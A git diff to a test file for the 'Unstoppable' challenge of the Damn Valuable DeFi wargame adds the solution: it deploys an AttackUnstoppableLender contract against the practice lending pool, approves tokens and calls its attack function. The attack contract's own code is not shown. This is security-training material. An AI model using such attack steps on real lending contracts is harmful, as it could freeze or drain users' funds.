@@ -4,6 +4,7 @@ const { accounts, contract } = require('@openzeppelin/test-environment');
 const DamnValuableToken = contract.fromArtifact('DamnValuableToken');
 const UnstoppableLender = contract.fromArtifact('UnstoppableLender');
 const ReceiverContract = contract.fromArtifact('ReceiverUnstoppable');
+const AttackUnstoppableLender = contract.fromArtifact('AttackUnstoppableLender');
 
 const { expect } = require('chai');
 
@@ -40,6 +41,9 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        const attackContract = await AttackUnstoppableLender.new(this.pool.address, { from: attacker });
+        await this.token.approve(attackContract.address, INITIAL_ATTACKER_BALANCE, { from: attacker });
+        await attackContract.attack(this.token.address, INITIAL_ATTACKER_BALANCE, { from: attacker });
     });
 
     after(async function () {
